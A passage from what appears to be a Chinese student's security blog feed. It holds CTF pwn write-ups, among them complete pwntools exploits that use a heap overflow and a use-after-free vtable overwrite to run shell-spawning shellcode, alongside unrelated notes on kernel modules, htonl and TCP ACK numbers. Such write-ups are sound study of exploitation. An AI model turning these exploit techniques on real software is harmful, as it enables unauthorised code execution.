    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> phone_number<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
t_node <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>cleanup<span class="token punctuation">)</span><span class="token punctuation">(</span>t_node <span class="token operator">*</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 8</span>
    t_node <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 8</span>
    t_entry entry<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 48</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 64 -> 0x40</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>单链表来操作…<br>这个…给name拷贝的时候是<code>char buf[256] -&gt; char name[32]</code>…<br>这个…给phone拷贝的时候是<code>char buf[256] -&gt; char name[16]</code>…<br>就是堆溢出..</p>
<p>看怎么getshell了…<br>看了一下啥保护都没开, 那我们可以铺shellcode了…<br>新建两个node, 然后修改node1, 使得node1的phone_number溢出覆盖node2的cleanup函数指针改为我们的shellcode<br>删除node2即可触发</p>
<p>开始以为要leak出什么东西来…后来发现在输入操作中使用到的buf是放在bss上的, 只要在删除node2之前那次把shellcode写入buf就OK了</p>
<p>开始搞错了…以为是edit node1的时候写shellcode…<br>然后仔细检查了一下, 是在remove node2的时候还要输入一次要删除的编号…这个时候又要使用一次buf</p>
<p>所以我们在edit的时候就写入<code>padding + p64(buf + off)</code><br>在remove的时候写入<code>&#39;2&#39; + (off - 1) * &#39; &#39; + shellcode</code> , 2是删除的编号, 空格是为了正常读入编号的padding, 所以我们的函数指针也要把这个padding加回来</p>
<p>这个off可以随便选…甚至可以是1…<br>read_int函数会从buf里sscanf一个<code>%d</code>, 所以要padding一下再写入我们的shellcode</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ctf"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">n_n</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    n_n<span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> name<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    n_n<span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>

buf <span class="token operator">=</span> <span class="token number">0x6020e0</span>

payload1 <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> 
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> payload1<span class="token punctuation">)</span>

sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload2  <span class="token operator">=</span> <span class="token string">'2'</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">7</span>
payload2 <span class="token operator">+=</span> sc
remove<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 补题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网络空间安全技术大赛(CSTC) | pwn]]></title>
      <url>/2018/05/16/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-CSTC-pwn/</url>
      <content type="html"><![CDATA[<p>去年的cstc是我CTF开始的地方…去年因为前面的好几支队不去决赛才顺延到了我们<br>去年在这里第一次做出来安卓, hhhh~<br>这次也只做了几道re和安卓…pwn还是没做出来…真是太菜了, 这里复现一下</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Asis CTF 2016 | b00ks]]></title>
      <url>/2018/05/15/Asis-CTF-2016-b00ks/</url>
      <content type="html"><![CDATA[<p>5月份就记下来要复现这题…今天才写.</p>
<p>除了Canary.其他的保护全开, 不能改got, 又是堆, 赌五毛是用malloc_hook, free_hook</p>
<p>复现完这题睡觉</p>
<p>功能, 了解一下</p>
<pre class="line-numbers language-python"><code class="language-python">Welcome to ASISCTF book library
Enter author name<span class="token punctuation">:</span> ary

<span class="token number">1</span><span class="token punctuation">.</span> Create a book
<span class="token number">2</span><span class="token punctuation">.</span> Delete a book
<span class="token number">3</span><span class="token punctuation">.</span> Edit a book
<span class="token number">4</span><span class="token punctuation">.</span> Print book detail
<span class="token number">5</span><span class="token punctuation">.</span> Change current author name
<span class="token number">6</span><span class="token punctuation">.</span> Exit
<span class="token operator">></span> <span class="token number">1</span>

Enter book name size<span class="token punctuation">:</span> <span class="token number">3</span>
Enter book name <span class="token punctuation">(</span>Max <span class="token number">32</span> chars<span class="token punctuation">)</span><span class="token punctuation">:</span> ddd

Enter book description size<span class="token punctuation">:</span> <span class="token number">4</span>
Enter book description<span class="token punctuation">:</span> eee

<span class="token number">1</span><span class="token punctuation">.</span> Create a book
<span class="token number">2</span><span class="token punctuation">.</span> Delete a book
<span class="token number">3</span><span class="token punctuation">.</span> Edit a book
<span class="token number">4</span><span class="token punctuation">.</span> Print book detail
<span class="token number">5</span><span class="token punctuation">.</span> Change current author name
<span class="token number">6</span><span class="token punctuation">.</span> Exit
<span class="token operator">></span> <span class="token number">4</span>
ID<span class="token punctuation">:</span> <span class="token number">1</span>
Name<span class="token punctuation">:</span> ddd
Description<span class="token punctuation">:</span> eee
Author<span class="token punctuation">:</span> ary
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对应的功能函数根据跳转表, 得出(以前的题目这么个性吗, 还是因为开了PIE)</p>
<pre class="line-numbers language-c"><code class="language-c">Create <span class="token operator">-</span> sub_F55
Del <span class="token operator">-</span> sub_BBD
Edit <span class="token operator">-</span> sub_E17
Show_Detail <span class="token operator">-</span> sub_D1F
Change_author <span class="token operator">-</span> sub_B6D
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> b00ks<span class="token punctuation">{</span>
    <span class="token keyword">int</span> id<span class="token punctuation">;</span> 
    <span class="token keyword">char</span> <span class="token operator">*</span> name<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span> description<span class="token punctuation">;</span>
    <span class="token keyword">int</span> desc_size<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个题目中的readn函数存在null byte的Off-By-One</p>
<p>我做这题…还是有点吃力</p>
<p>为了健康作息, 我果断关了IDA</p>
<p>做完这几题之后…读一下Atum的ppt</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> off-by-one </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HITCON Traing | zoo]]></title>
      <url>/2018/05/15/HITCON-Traing-zoo/</url>
      <content type="html"><![CDATA[<p>C++里这些…比如</p>
<pre class="line-numbers language-cpp"><code class="language-cpp">std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>Animal <span class="token operator">*</span><span class="token punctuation">,</span> std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span>Animal <span class="token operator">*</span><span class="token operator">>></span><span class="token operator">::</span><span class="token keyword">operator</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>animallist<span class="token punctuation">,</span> idx<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> animallist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>Animal <span class="token operator">*</span><span class="token punctuation">,</span> std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span>Animal <span class="token operator">*</span><span class="token operator">>></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>animallist<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> animallist<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>新建了俩dog, 我叫他们dog1, dog2</p>
<p>我的环境里是这样子</p>
<pre><code>0x2009c10 SIZE=0x30 DATA[0x2009c20] |........dog1....................| INUSED PREV_INUSE
0x2009c40 SIZE=0x20 DATA[0x2009c50] |........................1.......| INUSED PREV_INUSE
0x2009c60 SIZE=0x30 DATA[0x2009c70] |@1@.....dog2....................| INUSED PREV_INUSE
0x2009c90 SIZE=0x20 DATA[0x2009ca0] |p.......p...............Q.......| INUSED PREV_INUSE
</code></pre><p>这个<code>0x2009ca0</code>这里其实vector的内容,也就是animallist[0], animallist[1]的内容<br>注意….vector可不是在他那个bss那里存着, 那里就只存着三个指针, </p>
<pre><code>animallist.begin() -&gt; 0x2009ca0
animallist.end()   -&gt; 0x2009cb0
v.???
</code></pre><p>看一下我们的内容</p>
<pre><code>gdb-peda$ x/2gx 0x2009ca0
0x2009ca0:      0x0000000001a8ec20    0x0000000001a8ec70
</code></pre><p>注意一下的在于vector在earse之后, 后面的元素会前移<br>所以我们在remove(0)之后, 新add_dog得到的是<code>animallist[1]</code>, 但他的地址是原来remove掉的那块低块地址, 所以可以heap overflow来覆盖高地址的<code>animallist[0]</code>的原来叫做dog2的那个dog…</p>
<p>对比一下原来<code>0x2009ca0</code>的内容就OK</p>
<pre><code>gdb-peda$ x/2gx 0x2009ca0
0x2009ca0:      0x0000000001a8ec70    0x0000000001a8ec20
</code></pre><p>所以, 我overflow的时候, padding是8*9 = 0x48 个字节, </p>
<pre><code>padding + p64(fake_vtable)
</code></pre><p>这个fake_vatble正好覆盖在了<code>animallist[0]</code>, (原来高地址的dog2)的vtable上<br>现在调用<code>animallist[0] -&gt; speak()</code><br>就相当于<code>call fake_vtable[0]</code><br>也就是我们的nameofzoo放置的shellcode会被当做speak的代码来执行</p>
<p>代码…</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>


p <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">def</span> <span class="token function">gd</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># p = remote("115.159.49.85", 9999)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">recvu</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sendl</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add_dog</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> weight<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recvu<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    recvu<span class="token punctuation">(</span><span class="token string">'Name :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    recvu<span class="token punctuation">(</span><span class="token string">'Weight :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>weight<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add_cat</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> weight<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recvu<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    recvu<span class="token punctuation">(</span><span class="token string">'Name :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    recvu<span class="token punctuation">(</span><span class="token string">'Weight :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>weight<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recvu<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
    recvu<span class="token punctuation">(</span><span class="token string">'animal :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">listen</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recvu<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    recvu<span class="token punctuation">(</span><span class="token string">'animal :'</span><span class="token punctuation">)</span>
    sendl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


nameofzoo <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'nameofzoo'</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># name_of_zoo -> shellcode</span>
recvu<span class="token punctuation">(</span><span class="token string">'zoo :'</span><span class="token punctuation">)</span>
sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
len_sc <span class="token operator">=</span> len<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>
sc <span class="token operator">+=</span> p64<span class="token punctuation">(</span>nameofzoo<span class="token punctuation">)</span>
sendl<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>

add_dog<span class="token punctuation">(</span><span class="token string">'dog1'</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span>
add_dog<span class="token punctuation">(</span><span class="token string">'dog2'</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span>


remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

gd<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># UAF -> overlap vtable</span>
add_dog<span class="token punctuation">(</span><span class="token string">'padding.'</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>nameofzoo <span class="token operator">+</span> len_sc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span>


listen<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[failed to start load kernel modules 的解决]]></title>
      <url>/2018/05/06/failed-to-start-load-kernel-modules-%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
      <content type="html"><![CDATA[<p>开机的时候有两个failed, 是<code>failed to start load kernel modules</code>…<br>更新了一下, 变成了俩failed<br>暂时未解决…挖个坑</p>
<p>喔, 提示我开机查看一下…</p>
<pre class="line-numbers language-sh"><code class="language-sh">systemctl status systemd-modules-load.service
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>// emmmmm…..<br>感觉 journalctl -p4更详细一点</p>
<p>archlinux的wiki真好<br><a href="https://wiki.archlinux.org/index.php/Kernel_modules_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87" target="_blank" rel="external">https://wiki.archlinux.org/index.php/Kernel_modules_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87</a>)</p>
<p>我尝试直接删掉<code>/etc/modules-load.d/anbox.conf</code><br>….QAQ</p>
<p>在作死的边缘试探, 以前从来不敢胡乱删etc下面的东西…特别是什么什么.d下面的</p>
<p>重启!</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[网络编程里用到的函数]]></title>
      <url>/2018/05/05/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E9%87%8C%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0/</url>
      <content type="html"><![CDATA[<p>htons — host 2 network order, 2字节<br>htonl — host 2 network order, 4字节</p>
<p>ntohs — network 2 host order, 2字节<br>ntohl — network 2 host order, 4字节</p>
<p>在我的环境(Ubuntu 16.04 64bit)里</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// -m32</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token number">2</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span>   <span class="token number">4</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span>  <span class="token number">4</span>

<span class="token comment" spellcheck="true">// 64 bit</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token number">2</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span>   <span class="token number">4</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span>  <span class="token number">8</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以我在别人的项目里看到这样的代码…是没有问题的吗…?</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">encode32</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> uint32_t data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uint32_t ndata <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ndata<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> buf <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>htonl的参数是4字节..而在我的环境下long是8字节 ==!<br>试了一下, 是影响结果的…那么</p>
<p>喔. 查阅了一下, 应该是说这个函数定义就是接受4字节的uint32_t参数, 返回4字节…<br>只不过这个名字…emmmmmm</p>
<p>后来</p>
<p><a href="https://stackoverflow.com/questions/3022552/is-there-any-standard-htonl-like-function-for-64-bits-integers-in-c?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="external">https://stackoverflow.com/questions/3022552/is-there-any-standard-htonl-like-function-for-64-bits-integers-in-c?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a><br><a href="https://stackoverflow.com/questions/809902/64-bit-ntohl-in-c" target="_blank" rel="external">https://stackoverflow.com/questions/809902/64-bit-ntohl-in-c</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[unistd | 智障的一天]]></title>
      <url>/2018/05/05/unistd-%E6%99%BA%E9%9A%9C%E7%9A%84%E4%B8%80%E5%A4%A9/</url>
      <content type="html"><![CDATA[<p>今天又是除了皮, 什么都没做</p>
<p>晚上写代码的时候…new了一个cpp出来…准备用getopt…习惯性的写了一个</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后看了看它上面的</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后想…这个<code>.h</code>看着有点别扭…我为什么不写个<code>cunistd</code>试一试..<br>试一试就试一试<br>233333, 编译! 报错!<br>哈哈哈</p>
<p>皮这一下很开心</p>
<p>然后上stackoverflow搜了一下<br><a href="https://stackoverflow.com/questions/15331566/c-include-unistd-h-why-not-cunistd" target="_blank" rel="external">https://stackoverflow.com/questions/15331566/c-include-unistd-h-why-not-cunistd</a></p>
<p>毕设做的我真是心力交瘁</p>
]]></content>
      
        <categories>
            
            <category> 咸鱼 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[网络 | 对ACK一点疑惑]]></title>
      <url>/2018/05/03/%E7%BD%91%E7%BB%9C-%E5%AF%B9ACK%E4%B8%80%E7%82%B9%E7%96%91%E6%83%91/</url>
      <content type="html"><![CDATA[<h3 id="我的疑惑大概在于"><a href="#我的疑惑大概在于" class="headerlink" title="我的疑惑大概在于"></a>我的疑惑大概在于</h3><p>TCP里正常情况, 没有丢数据的时候<br>一个包(<code>n</code>号)的<code>Ack</code>值等于上一个包(<code>n-1</code>号)的<code>Seq + Len</code>, 大概是说已经收到的数据量(字节)<br>而<code>n</code>号包的<code>Seq</code>值等于上一个包的<code>Ack</code>, 就是这次要从<code>Seq</code>字节继续传</p>
<blockquote>
<p>而且这个确认(Ack)包可以延迟确认, 就说明这个Ack值前面的包都收到了</p>
</blockquote>
<p>表示出来大概是</p>
<pre><code>Seq=X Ack=Z Len=L1
------------------------&gt;

Seq=Z Ack=X+L1 Len=L2
&lt;------------------------

Seq=X+L1 Ack=Z+L2 Len=L3
------------------------&gt;
...
</code></pre><p>而在TCP建立连接时三次握手的时候, 为什么是</p>
<pre><code>[SYN] Seq=0, Len=0
--------------------------------&gt;

[SYN, ACK] Seq=0, ACK=1, Len=0
&lt;--------------------------------

[ACK] Seq=1, Ack=1, Len=0
--------------------------------&gt;
</code></pre><p>观察这些包的<code>Len=0</code>, 那为什么<code>Ack</code>会变成上个包的<code>Seq+1</code>, 而不是<code>Seq</code>呢</p>
<p>断开连接时的四次握手也是类似</p>
<pre><code>[FIN, ACK] Seq=X, Ack=Y, Len=0
--------------------------------&gt;

[ACK] Seq=Y, ACK=X+1, Len=0
&lt;--------------------------------

[FIN, ACK] Seq=Y, Ack=X+1, Len=0
&lt;--------------------------------

[ACK] Seq=Y+1, ACK=X+1, Len=0
--------------------------------&gt;
</code></pre><p>这是…为什么呢QAQ<br>书里还提到…这里可以延迟确认, 省去第二个包…其实看起来好像第二个包没起到什么作用<br>像下图一样</p>
<pre><code>[FIN, ACK] Seq=X, Ack=Y, Len=0
--------------------------------&gt;

[FIN, ACK] Seq=Y, Ack=X+1, Len=0
&lt;--------------------------------

[ACK] Seq=Y+1, ACK=X+1, Len=0
--------------------------------&gt;
</code></pre><p>关于网络…其实好多东西…怎么说<br>就像NAT里好多东西, 在不同RFC里定义都不一样了<br>可能有一些东西就互相矛盾了<br>当然还是我菜…</p>
<h3 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h3><p>学长给了资料, 我还是太菜了<br><a href="http://packetlife.net/blog/2010/jun/7/understanding-tcp-sequence-acknowledgment-numbers/" target="_blank" rel="external">http://packetlife.net/blog/2010/jun/7/understanding-tcp-sequence-acknowledgment-numbers/</a></p>
<p>博主的这段</p>
